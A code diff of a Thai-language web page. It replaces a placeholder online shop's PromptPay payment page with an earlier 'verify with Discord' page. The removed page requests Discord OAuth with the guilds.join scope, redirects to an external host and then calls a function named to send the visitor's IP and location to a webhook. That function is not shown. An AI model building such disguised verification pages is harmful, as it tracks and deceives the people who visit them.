@@ -2,115 +2,66 @@
 <html lang="th">
 <head>
   <meta charset="UTF-8" />
-  <title>ยืนยันตัวตนด้วย Discord</title>
-  <style>
-    body {
-      font-family: "Sarabun", sans-serif;
-      background: linear-gradient(to right, #e0f7fa, #f0f4f8);
-      color: #333;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-
-    .container {
-      max-width: 500px;
-      background: #ffffff;
-      margin: 50px 20px;
-      padding: 30px 20px;
-      border-radius: 20px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-      text-align: center;
-    }
-
-    h2 {
-      font-size: 2rem;
-      color: #00796b;
-      margin-bottom: 20px;
-    }
-
-    #slideshow {
-      margin: 30px auto;
-      max-width: 400px;
-      max-height: 400px;
-      border-radius: 15px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-      object-fit: cover;
-      transition: opacity 0.5s ease-in-out;
-    }
-
-    button {
-      background-color: #009688;
-      color: #fff;
-      padding: 14px 28px;
-      font-size: 1.1rem;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-      margin-top: 15px;
-      box-shadow: 0 6px 12px rgba(0, 150, 136, 0.3);
-    }
-
-    button:hover {
-      background-color: #00796b;
-    }
-
-    .fb-comments {
-      margin-top: 40px;
-    }
-  </style>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ร้านค้าออนไลน์</title>
+  <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-  <div class="container">
-    <h2>📍 ยืนยันตัวตน Discord</h2>
+<body class="bg-gray-100 text-gray-800">
 
-    <img id="slideshow" src="https://i.pinimg.com/originals/8c/b2/88/8cb288daa036f41d26e5bf9118360ccd.jpg" alt="Slideshow Image" />
+  <!-- Header -->
+  <header class="bg-white shadow-md p-4">
+    <div class="max-w-6xl mx-auto flex justify-between items-center">
+      <h1 class="text-2xl font-bold text-blue-600">ร้านค้าออนไลน์</h1>
+      <nav>
+        <ul class="flex space-x-4">
+          <li><a href="#" class="hover:text-blue-500">หน้าแรก</a></li>
+          <li><a href="#" class="hover:text-blue-500">สินค้า</a></li>
+          <li><a href="#payment" class="hover:text-blue-500">ชำระเงิน</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
 
-    <button id="loginBtn">เข้าสู่ระบบด้วย Discord </button>
+  <!-- Product Section -->
+  <section class="max-w-6xl mx-auto px-4 py-8">
+    <h2 class="text-2xl font-semibold mb-6">สินค้าทั้งหมด</h2>
+    <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-6">
 
-  <script>
-    // ==== สไลด์รูปภาพ ====
-    const images = [
-      "https://i.pinimg.com/originals/8c/b2/88/8cb288daa036f41d26e5bf9118360ccd.jpg",
-      "https://m.media-amazon.com/images/S/pv-target-images/14117e646cbbd335e492cae12eb39762f02e1a4c0bf98868009444aec2e62d30.jpg",
-      "https://m.media-amazon.com/images/S/pv-target-images/7d25a2bf9820ec7310037be0ea7258dcc0b9a1a1218a4622068b87b9e7f394ce.jpg"
-    ];
-    let currentIndex = 0;
-    const slideshowEl = document.getElementById("slideshow");
-    function changeImage() {
-      currentIndex = (currentIndex + 1) % images.length;
-      slideshowEl.style.opacity = 0;
-      setTimeout(() => {
-        slideshowEl.src = images[currentIndex];
-        slideshowEl.style.opacity = 1;
-      }, 500);
-    }
-    setInterval(changeImage, 3000);
+      <!-- สินค้า -->
+      <div class="bg-white rounded-lg shadow p-4">
+        <img src="https://via.placeholder.com/300x200" alt="สินค้า" class="rounded mb-3">
+        <h3 class="text-lg font-semibold">ชื่อสินค้า</h3>
+        <p class="text-gray-600">รายละเอียดสั้นๆ ของสินค้า</p>
+        <p class="text-blue-600 font-bold mt-2">฿100</p>
+        <a href="#payment">
+          <button class="mt-3 w-full bg-blue-500 text-white py-2 rounded hover:bg-blue-600">
+            ชำระเงิน
+          </button>
+        </a>
+      </div>
 
-    // ==== Discord OAuth ====
-    const CLIENT_ID = "1226784287907512342";  // ใส่ client id ของคุณ
-    const REDIRECT_URI = encodeURIComponent("https://sftp.ca-node-28.katabump.com:2022/callback");  // ใส่ redirect URI ของคุณ
-    const SCOPE = "identify guilds.join";
-    const loginBtn = document.getElementById("loginBtn");
-    const statusEl = document.getElementById("status");
+      <!-- เพิ่มสินค้าตามต้องการ -->
 
-    loginBtn.addEventListener("click", () => {
-      const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&response_type=code&scope=${SCOPE}`;
-      window.location.href = discordAuthUrl;
-    });
+    </div>
+  </section>
 
-    // ตรวจว่ากลับมาจาก Discord (มี code อยู่) → ส่งข้อมูลเลย
-    function getQueryParam(param) {
-      return new URLSearchParams(window.location.search).get(param);
-    }
+  <!-- Payment Section -->
+  <section id="payment" class="bg-white p-8 mt-8 shadow-md max-w-3xl mx-auto rounded-lg">
+    <h2 class="text-xl font-semibold mb-4 text-center text-green-600">ชำระเงินผ่าน PromptPay</h2>
+    <p class="text-center mb-4 text-gray-700">กรุณาสแกน QR Code ด้านล่างเพื่อชำระเงินจำนวน <span class="font-bold">100 บาท</span></p>
+    
+    <div class="flex justify-center mb-4">
+      <!-- เปลี่ยนเบอร์โทรให้เป็นของคุณเอง -->
+      <img src="https://promptpay.io/0801234567/100.png" alt="QR PromptPay" class="w-60 border rounded-lg shadow"/>
+    </div>
 
-    if (getQueryParam("code")) {
-      loginBtn.style.display = "none";
-      sendIpLocationToWebhook();
-    }
-  </script>
+    <p class="text-center text-sm text-gray-500">ชื่อบัญชี: ร้านค้าออนไลน์<br>โทร: 080-123-4567</p>
+  </section>
+
+  <!-- Footer -->
+  <footer class="bg-white border-t p-4 mt-12 text-center text-gray-500 text-sm">
+    © 2025 ร้านค้าออนไลน์. สงวนลิขสิทธิ์
+  </footer>
+
 </body>
 </html>
